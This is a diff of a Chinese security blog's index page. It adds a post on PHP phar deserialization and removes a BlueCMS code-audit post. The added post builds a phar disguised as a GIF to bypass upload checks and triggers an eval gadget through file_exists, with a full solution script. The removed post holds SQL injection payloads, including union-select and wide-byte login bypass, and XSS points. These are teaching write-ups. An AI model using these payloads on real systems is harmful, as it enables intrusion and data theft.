@@ -155,6 +155,93 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-phar" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/11/11/phar/">phar反序列化总结</a>
+    </h1>
+  
+
+        
+        <a href="/2019/11/11/phar/" class="archive-article-date">
+  	<time datetime="2019-11-11T05:40:51.318Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h2><p>phar文件是一种压缩文件，在php手册中可以看到各个数据块的信息。</p>
+<p>phar文件的读取是通过phar协议读取的，在读取phar文件的时候，文件内容会转换为对象，Meata-data数据块中的内容会被反序列。<br>四个部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. a stub </span><br><span class="line">一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;,前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</span><br><span class="line"></span><br><span class="line">2. manifest</span><br><span class="line">phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。</span><br><span class="line"></span><br><span class="line">3. contents</span><br><span class="line">压缩文件的内容</span><br><span class="line"></span><br><span class="line">4. signature</span><br><span class="line">文件的签名内容</span><br></pre></td></tr></table></figure></p>
+<h2 id="demo测试"><a href="#demo测试" class="headerlink" title="demo测试"></a>demo测试</h2><p>phar文件的制作可以使用php内置的Phar类来实现。</p>
+<p>前提先将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="phar伪装其它格式文件"><a href="#phar伪装其它格式文件" class="headerlink" title="phar伪装其它格式文件"></a>phar伪装其它格式文件</h2><p>php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $file = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"kite.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"kite.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/11/07/MEkQyT.png" alt="image"></p>
+<p>可以看到meta-data是以序列化的形式存储的，采用这种方法可以绕过很大一部分上传检测。</p>
+<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
+<p><img src="https://s2.ax1x.com/2019/11/08/MVLZ7V.png" alt="image"></p>
+<h2 id="demo测试-1"><a href="#demo测试-1" class="headerlink" title="demo测试"></a>demo测试</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; file;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://kite.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/11/08/MZCkP1.png" alt="image"></p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phar文件要能够上传到服务器端。</p>
+<p>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数</p>
+<p>要有可用的魔术方法作为“跳板”。</p>
+<p>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>uoload_file.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/gif"</span>)&amp;&amp;(substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>)+<span class="number">1</span>))== <span class="string">'gif'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">            <span class="string">"upload_file/"</span> .$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Invalid file,you can only upload gif"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>upload_file.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://127.0.0.1/test/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p>
+<p>file_un.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure></p>
+<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'123.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">'phpinfo();'</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后修改后缀名为gif</p>
+<p><img src="https://s2.ax1x.com/2019/11/08/MZtF2t.png" alt="image"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://paper.seebug.org/680/#22-demo" target="_blank" rel="noopener">https://paper.seebug.org/680/#22-demo</a></p>
+<p><a href="https://xz.aliyun.com/t/2715#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715#toc-12</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/11/11/phar/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-crlf" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -896,93 +983,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/07/31/sql-hack1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-bluecms" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/09/bluecms/">代码审计[day1]-bluecms</a>
-    </h1>
-  
-
-        
-        <a href="/2019/06/09/bluecms/" class="archive-article-date">
-  	<time datetime="2019-06-09T03:47:40.622Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>bluecms是一种小众cms，适合用来入门代码审计，代码本身一堆漏洞，方便小白快速理解入门</p>
-<h3 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h3><p>BlueCMS v1.6 sp1</p>
-<p>Phpstudy php5.2+apache+mysql</p>
-<p>Windows10</p>
-<h3 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h3><h4 id="SQL1"><a href="#SQL1" class="headerlink" title="SQL1"></a>SQL1</h4><p>./ad_js.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">require_once dirname(__FILE__).&apos;/include/common.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br><span class="line">...</span><br><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br><span class="line">...</span><br><span class="line">		$ad_content = $ad[&apos;content&apos;];</span><br><span class="line">...</span><br><span class="line">echo &quot;&lt;!--\r\ndocument.write(\&quot;&quot;.$ad_content.&quot;\&quot;);\r\n--&gt;\r\n&quot;;</span><br></pre></td></tr></table></figure></p>
-<p>每个文件基本都包含了common.inc.php，而在这个文件中，有一处这样的过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">	$_POST = deep_addslashes($_POST);</span><br><span class="line">	$_GET = deep_addslashes($_GET);</span><br><span class="line">	$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">	$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>而deep_addslashes定义是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function deep_addslashes($str)</span><br><span class="line">&#123;</span><br><span class="line">	if(is_array($str))</span><br><span class="line">	&#123;</span><br><span class="line">		foreach($str as $key=&gt;$val)</span><br><span class="line">		&#123;</span><br><span class="line">			$str[$key] = deep_addslashes($val);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$str = addslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>不过这里的过滤只针对字符型注入，而这里的sql语句是整型注入，不受过滤影响</p>
-<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_js.php?ad_id=0 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/06/09/VsSRDU.jpg" alt="image"></p>
-<h4 id="IP注入"><a href="#IP注入" class="headerlink" title="IP注入"></a>IP注入</h4><p>./include/common.fun.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getip()</span><br><span class="line">&#123;</span><br><span class="line">	if (getenv(&apos;HTTP_CLIENT_IP&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_CLIENT_IP&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_X_FORWARDED&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_FORWARDED&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_FORWARDED&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">	&#125;</span><br><span class="line">	return $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>全局搜索一下在guest_book.php发现可利用点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$online_ip = getip();</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">elseif ($act == &apos;send&apos;)</span><br><span class="line">&#123;</span><br><span class="line">	$user_id = $_SESSION[&apos;user_id&apos;] ? $_SESSION[&apos;user_id&apos;] : 0;</span><br><span class="line">	$rid = intval($_POST[&apos;rid&apos;]);</span><br><span class="line"> 	$content = !empty($_POST[&apos;content&apos;]) ? htmlspecialchars($_POST[&apos;content&apos;]) : &apos;&apos;;</span><br><span class="line"> 	$content = nl2br($content);</span><br><span class="line"> 	if(empty($content))</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		showmsg(&apos;评论内容不能为空&apos;);</span><br><span class="line"> 	&#125;</span><br><span class="line">	$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="line">			VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;$online_ip&apos;, &apos;$content&apos;)&quot;;</span><br><span class="line">	$db-&gt;query($sql);</span><br><span class="line">	showmsg(&apos;恭喜你留言成功&apos;, &apos;guest_book.php?page_id=&apos;.$_POST[&apos;page_id&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://s2.ax1x.com/2019/06/09/Vsw06H.jpg" alt="image"></p>
-<p><img src="https://s2.ax1x.com/2019/06/09/VswoBn.jpg" alt="image"></p>
-<h4 id="SQL宽字节注入"><a href="#SQL宽字节注入" class="headerlink" title="SQL宽字节注入"></a>SQL宽字节注入</h4><p>数据库是采用gbk编码的，所以在./admin/login.php存在宽字节注入，宽字节原理这里大概讲下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注入语句为%df&apos; or 1=1# ,而一般开启了gpc或者是有addslashes函数的会自动给引号加上反斜杆\,\在url编码中是%5c,则MySQL用GBK的编码时，会认为%df%5c是一个宽字符，也就是縗,%df\’ = %df%5c%27=縗’,最后就造成了字符注入。</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;do_login&apos;)&#123;</span><br><span class="line"> 	...</span><br><span class="line"> 	if(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> 		update_admin_info($admin_name);</span><br><span class="line"> 		...</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;else&#123;</span><br><span class="line"> 		showmsg(&apos;您输入的用户名和密码有误&apos;);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	showmsg(&apos;欢迎您 &apos;.$admin_name.&apos; 回来，现在将转向管理中心...&apos;, &apos;index.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-<p>而check_admin定义是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function check_admin($name, $pwd)</span><br><span class="line">&#123;</span><br><span class="line">	global $db;</span><br><span class="line">	$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</span><br><span class="line"> 	if($row[&apos;num&apos;] &gt; 0)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		return true;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	else</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		return false;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/06/10/VyeMwR.jpg" alt="image"></p>
-<p><img src="https://s2.ax1x.com/2019/06/10/Vye3Y6.jpg" alt="image"></p>
-<h4 id="xss注入"><a href="#xss注入" class="headerlink" title="xss注入"></a>xss注入</h4><p>./user.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">//编辑个人资料</span><br><span class="line"></span><br><span class="line">elseif($act == &apos;edit_user_info&apos;)&#123;</span><br><span class="line"></span><br><span class="line">	 $user_id = intval($_SESSION[&apos;user_id&apos;]);</span><br><span class="line"></span><br><span class="line">	 if(empty($user_id))&#123;</span><br><span class="line"></span><br><span class="line">		 return false;</span><br><span class="line"></span><br><span class="line">	 &#125;</span><br><span class="line"></span><br><span class="line">	$birthday = trim($_POST[&apos;birthday&apos;]);</span><br><span class="line"></span><br><span class="line">	$sex = intval($_POST[&apos;sex&apos;]);</span><br><span class="line"></span><br><span class="line">    $email = !empty($_POST[&apos;email&apos;]) ? trim($_POST[&apos;email&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $msn = !empty($_POST[&apos;msn&apos;]) ? trim($_POST[&apos;msn&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $qq = !empty($_POST[&apos;qq&apos;]) ? trim($_POST[&apos;qq&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $mobile_phone = !empty($_POST[&apos;mobile_phone&apos;]) ? trim($_POST[&apos;mobile_phone&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $office_phone = !empty($_POST[&apos;office_phone&apos;]) ? trim($_POST[&apos;office_phone&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $home_phone   = !empty($_POST[&apos;home_phone&apos;]) ? trim($_POST[&apos;home_phone&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">	$address = !empty($_POST[&apos;address&apos;]) ? htmlspecialchars($_POST[&apos;address&apos;]) : &apos;&apos;;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/06/10/V6VaQg.jpg" alt="image"></p>
